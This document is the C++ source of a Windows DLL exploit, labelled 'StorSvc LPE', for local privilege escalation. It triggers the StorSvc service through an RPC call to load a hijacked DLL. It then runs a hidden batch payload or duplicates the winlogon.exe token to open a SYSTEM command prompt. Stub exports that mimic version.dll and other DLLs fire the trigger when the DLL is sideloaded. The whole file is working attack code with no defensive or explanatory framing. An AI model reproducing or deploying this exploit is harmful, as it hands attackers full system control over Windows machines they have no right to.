#define VER_H

#include <windows.h>
#include <TlHelp32.h>

#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#include "storsvc_h.h"

#pragma comment(lib, "RpcRT4.lib")

#define SHOW_MSGBOX

static HMODULE g_hDLL = NULL;

void __RPC_FAR* __RPC_USER midl_user_allocate(size_t cBytes)
{
    return((void __RPC_FAR*) malloc(cBytes));
}

void __RPC_USER midl_user_free(void __RPC_FAR* p)
{
    free(p);
}

void TriggerStorRPCCall()
{
	RPC_STATUS status;
	RPC_WSTR StringBinding;
	RPC_BINDING_HANDLE Binding;

	status = RpcStringBindingCompose(
		NULL,
		(RPC_WSTR)L"ncalrpc",
		(RPC_WSTR)L"",
		(RPC_WSTR)L"",
		NULL,
		&StringBinding
	);

	status = RpcBindingFromStringBinding(
		StringBinding,
		&Binding
	);

	status = RpcStringFree(
		&StringBinding
	);

	RpcTryExcept
	{
		long result = Proc6_SvcRebootToFlashingMode(Binding, 0, 0);
		if (result == 0)
		{
			//wprintf(L"[+] Dll hijack triggered!");
#ifdef SHOW_MSGBOX
			MessageBox(NULL, L"Dll hijack triggered", L"StorSvc LPE", MB_ICONINFORMATION);
#endif
		}
		else
		{
			//wprintf(L"[!] Manual reboot of StorSvc service is required.");
#ifdef SHOW_MSGBOX
			MessageBox(NULL, L"Manual reboot of StorSvc service is required", L"StorSvc LPE", MB_ICONWARNING);
#endif
		}
	}
	RpcExcept(EXCEPTION_EXECUTE_HANDLER);
	{
		//wprintf(L"Exception: %d - 0x%08x\r\n", RpcExceptionCode(), RpcExceptionCode());
#ifdef SHOW_MSGBOX
		MessageBox(NULL, L"Exception: 1753", L"StorSvc LPE", MB_ICONERROR);
#endif
	}
	RpcEndExcept

	status = RpcBindingFree(&Binding);
}

BOOL RunPayloadBatch(HMODULE dll)
{
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;
	WCHAR path[MAX_PATH];
	WCHAR command[MAX_PATH + 32];

	path[0] = L'\0';
	if (GetModuleFileNameW(dll, path, MAX_PATH - 5))
	{
		lstrcatW(path, L".bat");
	}
	if ((!path[0]) || (GetFileAttributesW(path) == INVALID_FILE_ATTRIBUTES))
	{
		if (!GetSystemWindowsDirectoryW(path, 80))
		{
			lstrcpyW(path, L"C:\\");
		}
		lstrcpyW(&path[3], L"ProgramData\\SprintCSP.dll.bat");
	}
	if (GetFileAttributesW(path) != INVALID_FILE_ATTRIBUTES)
	{
		wsprintfW(command, L"cmd.exe /c \"%s\"", path);
		memset(&pi, 0, sizeof(pi));
		memset(&si, 0, sizeof(si));
		si.cb = sizeof(si);
		si.dwFlags = STARTF_FORCEOFFFEEDBACK | STARTF_USESHOWWINDOW;
		si.wShowWindow = SW_HIDE;
		if (CreateProcessAsUserW(NULL, NULL, command, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
		{
			CloseHandle(pi.hThread);
			CloseHandle(pi.hProcess);
		}
		return TRUE;
	}
	return FALSE;
}

DWORD GetProcessPID(const WCHAR* name, BOOL current_session, BOOL active_session)
{
	DWORD session = -1;
	DWORD proc_session = -1;
	PROCESSENTRY32W pe32;
	HANDLE snapshot = NULL;

	if (active_session)
	{
		proc_session = WTSGetActiveConsoleSessionId();
	}
	else if (current_session)
	{
		if (!ProcessIdToSessionId(GetCurrentProcessId(), &proc_session))
		{
			return 0;
		}
	}
	memset(&pe32, 0, sizeof(pe32));
	pe32.dwSize = sizeof(pe32);
	snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snapshot != INVALID_HANDLE_VALUE)
	{
		if (Process32FirstW(snapshot, &pe32))
		{
			do
			{
				if (current_session || active_session)
				{
					if (!ProcessIdToSessionId(pe32.th32ProcessID, &session))
					{
						continue;
					}
					if (proc_session != session)
					{
						continue;
					}
				}
				if (!lstrcmpiW(name, pe32.szExeFile))
				{
					CloseHandle(snapshot);
					return pe32.th32ProcessID;
				}
			} while (Process32NextW(snapshot, &pe32));
		}
		CloseHandle(snapshot);
	}
	return 0;
}

BOOL StartCMDInActiveSession()
{
	WCHAR command[] = L"cmd.exe";
	PROCESS_INFORMATION pi;
	STARTUPINFOW si;
	HANDLE process = NULL;
	DWORD pid = 0;
	HANDLE token = NULL;
	HANDLE duptoken = NULL;
	TOKEN_PRIVILEGES priv;
	LUID luid;

	pid = GetProcessPID(L"winlogon.exe", FALSE, TRUE);
	if (!pid)
	{
		pid = GetProcessPID(L"winlogon.exe", FALSE, FALSE);
	}
	if (!pid)
	{
		return FALSE;
	}
	process = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
	if (!process)
	{
		return FALSE;
	}
	if (!OpenProcessToken(process, MAXIMUM_ALLOWED, &token))
	{
		CloseHandle(process);
		return FALSE;
	}
	CloseHandle(process);
	if (!DuplicateTokenEx(token, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &duptoken))
	{
		CloseHandle(token);
		return FALSE;
	}
	CloseHandle(token);
	if (!LookupPrivilegeValueW(NULL, SE_ASSIGNPRIMARYTOKEN_NAME, &luid))
	{
		CloseHandle(duptoken);
		return FALSE;
	}
	priv.PrivilegeCount = 1;
	priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	priv.Privileges[0].Luid = luid;
	if(!AdjustTokenPrivileges(duptoken, FALSE, &priv, sizeof(priv), NULL, NULL))
	{
		CloseHandle(duptoken);
		return FALSE;
	}
	if (!ImpersonateLoggedOnUser(duptoken))
	{
		CloseHandle(duptoken);
		return FALSE;
	}
	memset(&pi, 0, sizeof(pi));
	memset(&si, 0, sizeof(si));
	si.cb = sizeof(si);
	si.dwFlags = STARTF_FORCEOFFFEEDBACK | STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOW;
	si.lpDesktop = (LPWSTR)L"winsta0\\default";
	if (CreateProcessAsUser(duptoken, NULL, command, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
	{
		CloseHandle(duptoken);
		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);
	}
	else
	{
		CloseHandle(duptoken);
		return FALSE;
	}
	return TRUE;
}

extern "C" int __declspec(dllexport) FactoryResetUICC()
{
	if (!RunPayloadBatch(g_hDLL))
	{
		StartCMDInActiveSession();
	}
	return 0;
}

extern "C" int __declspec(dllexport) Trigger()
{
	TriggerStorRPCCall();
	return 0;
}

extern "C" int __declspec(dllexport) RegisterOCX()
{
	TriggerStorRPCCall();
	return 0;
}

extern "C" int __declspec(dllexport) DllRegisterServer()
{
	TriggerStorRPCCall();
	return 0;
}

extern "C" int __declspec(dllexport) DllUnregisterServer()
{
	TriggerStorRPCCall();
	return 0;
}

extern "C" int __declspec(dllexport) DllInstall()
{
	TriggerStorRPCCall();
	return 0;
}

extern "C" int __declspec(dllexport) DllUninstall()
{
	TriggerStorRPCCall();
	return 0;
}

extern "C" int __declspec(dllexport) CPlApplet()
{
	TriggerStorRPCCall();
	return 0;
}

extern "C" int __declspec(dllexport) GetFileVersionInfoW()
{
	TriggerStorRPCCall();
	ExitProcess(0);
	return 0;
}

extern "C" int __declspec(dllexport) VerQueryValueW()
{
	TriggerStorRPCCall();
	ExitProcess(0);
	return 0;
}

extern "C" int __declspec(dllexport) GetFileVersionInfoSizeW()
{
	TriggerStorRPCCall();
	ExitProcess(0);
	return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		g_hDLL = hModule;
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
